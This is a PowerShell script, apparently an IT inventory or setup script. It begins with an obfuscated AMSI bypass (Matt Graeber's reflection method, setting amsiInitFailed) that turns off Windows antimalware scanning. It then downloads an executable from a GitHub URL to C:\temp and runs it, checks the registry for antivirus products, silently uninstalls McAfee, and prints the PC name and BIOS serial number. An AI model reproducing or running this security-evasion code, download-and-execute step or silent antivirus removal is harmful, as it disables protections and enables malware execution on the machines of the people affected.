#Matt Graebers Reflection method with WMF5 autologging bypass 
$KV=$null;$knyqafwlk="$([CHAR]([BYTe]0x53)+[ChAR](62+59)+[chaR]([BYTe]0x73)+[ChAr]([BYtE]0x74)+[Char]([byte]0x65)+[ChAR](109+44-44)).$(('Mánágeme'+'nt').NORMAlizE([ChaR](70+49-49)+[cHaR]([ByTe]0x6f)+[ChAR](24+90)+[cHaR](109)+[ChAr](2+66)) -replace [chAr]([byTE]0x5c)+[chAR]([BYte]0x70)+[CHAR]([ByTE]0x7b)+[char]([bYTE]0x4d)+[cHar]([ByTe]0x6e)+[chaR]([BYtE]0x7d)).$([cHAR](26+39)+[cHar]([bytE]0x75)+[ChAr]([BYte]0x74)+[chAr]([BytE]0x6f)+[char]([BYtE]0x6d)+[chAr](75+22)+[cHAr]([bYTE]0x74)+[chAR]([Byte]0x69)+[CHaR](111)+[ChaR](110+44-44)).$(('Ã'+'m'+'s'+'î'+'U'+'t'+'í'+'l'+'s').NOrmALizE([cHaR](70)+[CHaR]([BYTE]0x6f)+[cHar](114*69/69)+[CHar](1+108)+[chAr]([BytE]0x44)) -replace [chaR](92*60/60)+[chAr](112+22-22)+[ChAr]([bYte]0x7b)+[cHar]([byTE]0x4d)+[CHaR]([bYte]0x6e)+[cHar](125+26-26))";$a="+[chAr](120+69-69)+[CHAr](119*106/106)+[chaR]([Byte]0x64)+[char](121*15/15)+[CHaR]([bytE]0x67)+[ChaR]([BytE]0x6d)+[CHaR](32+80)+[CHAR]([Byte]0x64)+[CHAR]([BYTe]0x72)+[cHAR]([bYTE]0x62)+[ChAr]([byTe]0x6d)+[cHAr]([bytE]0x6a)+[chAR]([byTE]0x68)+[cHar](100)+[ChAr](120)+[char]([byte]0x79)+[CHAr](121*75/75)+[char]([byTe]0x67)+[cHaR](120+113-113)+[char](99+41-41)+[chaR](100+47-47)+[chaR](97*26/26)+[CHaR]([bYTE]0x64)+[chaR]([ByTe]0x72)+[Char]([bYTe]0x72)+[CHAr](52+66)";[Threading.Thread]::Sleep(1282);[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType($(('$([CHAR]([BYTe]0x53)+[ChAR](62+59)+[chaR]([BYTe]0x73)+[ChAr]([BYtE]0x74)+[Char]([byte]0x65)+[ChAR](109+44-44)).Reflectîón.BìndìngFlá'+'gs').nORMAlize([char](70)+[cHAr](8+103)+[CHaR]([ByTE]0x72)+[CHAr]([bYte]0x6d)+[ChaR]([BYte]0x44)) -replace [chAR]([byTE]0x5c)+[ChaR](112+32-32)+[cHAR](74+49)+[ChAR]([ByTE]0x4d)+[CHAr](14+96)+[chAr]([BYtE]0x7d)))).FullName), $([CHAR]([BYTe]0x53)+[ChAR](62+59)+[chaR]([BYTe]0x73)+[ChAr]([BYtE]0x74)+[Char]([byte]0x65)+[ChAR](109+44-44)).Reflection.FieldInfo]" -as [String].Assembly.GetType($(('$([CHAR]([BYTe]0x53)+[ChAR](62+59)+[chaR]([BYTe]0x73)+[ChAr]([BYtE]0x74)+[Char]([byte]0x65)+[ChAR](109+44-44))'+'.Type').noRmalIZe([cHAr]([ByTe]0x46)+[ChAr]([bYTE]0x6f)+[ChAr](114+79-79)+[cHar]([ByTe]0x6d)+[CHAR](68+17-17)) -replace [Char](61+31)+[char]([byTe]0x70)+[cHar]([bYTE]0x7b)+[ChAR](77+46-46)+[ChaR](110+29-29)+[ChAR](125)))), [Object]([Ref].Assembly.GetType($knyqafwlk)),($([ChAr]([BYTe]0x47)+[cHar](16+85)+[ChaR](116+2-2)+[Char]([bYte]0x46)+[cHar](105+17-17)+[Char]([BytE]0x65)+[CHAr]([Byte]0x6c)+[char](100+53-53)))).Invoke($(('ãms'+'îÎn'+'ìtF'+'áîl'+'ed').NORmaLiZe([char]([BYTE]0x46)+[CHAr]([bYtE]0x6f)+[Char](114+84-84)+[CHaR](109*5/5)+[CHAR]([byte]0x44)) -replace [chaR](11+81)+[CHAR](49+63)+[CHar](123)+[cHaR]([byTe]0x4d)+[chaR](81+29)+[cHaR](78+47)),(("NonPublic,Static") -as [String].Assembly.GetType($(('$([CHAR]([BYTe]0x53)+[ChAR](62+59)+[chaR]([BYTe]0x73)+[ChAr]([BYtE]0x74)+[Char]([byte]0x65)+[ChAR](109+44-44)).Reflectîón.BìndìngFlá'+'gs').nORMAlize([char](70)+[cHAr](8+103)+[CHaR]([ByTE]0x72)+[CHAr]([bYte]0x6d)+[ChaR]([BYte]0x44)) -replace [chAR]([byTE]0x5c)+[ChaR](112+32-32)+[cHAR](74+49)+[ChAR]([ByTE]0x4d)+[CHAr](14+96)+[chAr]([BYtE]0x7d))))).SetValue($KV,$True);

$url = "https://github.com/jelpsIT/duckery/raw/main/DumpEDID.exe"
$outputPath = "C:\temp\"

# Check if the output path exists
if (-not (Test-Path $outputPath -PathType Container)) {
    # Create the output path if it doesn't exist
    New-Item -ItemType Directory -Path $outputPath | Out-Null
    Write-Output "$outputPath created successfully."
} else {
    Write-Output "$outputPath already exists."
}
$outputPath = "C:\temp\DUMPEDID.exe"

# Download the file
Invoke-WebRequest -Uri $url -OutFile $outputPath

# Navigate to the download directory
Set-Location (Split-Path $outputPath)

# Run the file
& cmd.exe /c "DUMPEDID.exe"
Write-Output "`n "

$programs = "Webroot", "Bitdefender", "McAfee", "Windows Agent", "Fresh"
$table1 = @()

foreach ($program in $programs) {
    $exists = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Where-Object { $_.DisplayName -match $program }
    $row = New-Object PSObject -Property @{ 
        "Program" = $program
        "Exists"  = if ($exists) { "Yes" } else { "No" } 
    }
    $table1 += $row
}


# Check if McAfee is installed and uninstall it
$mcafee = $installedApps | Where-Object { $_.DisplayName -match "McAfee" }
if ($mcafee) {
    Write-Host "Uninstalling $($mcafee.DisplayName) ..."
    $uninstallCmd = $mcafee.QuietUninstallString -replace "msiexec.exe", "msiexec.exe /qn"
    $process = Start-Process cmd -ArgumentList "/c $uninstallCmd" -Wait -PassThru
    if ($process.ExitCode -eq 0) {
        Write-Host "$($mcafee.DisplayName) has been uninstalled."
    } else {
        Write-Warning "Failed to uninstall $($mcafee.DisplayName)."
    }
} else {
    Write-Host "McAfee is not installed."
}

# Get the PC name
$pcName = $env:COMPUTERNAME

# Get the serial number
$serialNumber = Get-WmiObject Win32_BIOS | Select-Object SerialNumber

# Format the output into a table
$table2 = New-Object -TypeName PSObject -Property @{
    "PC Name" = $pcName
    "Serial Number" = $serialNumber.SerialNumber
} | Format-Table -AutoSize

# Display the table
Write-Output $table1
# Display the table with highlighted headers
Write-Host "PC Name:`t$pcName" -ForegroundColor Yellow
Write-Host "Serial Number:`t$($serialNumber.SerialNumber)`n" -ForegroundColor Yellow


# add download bitdefender and xml file with user prompts 

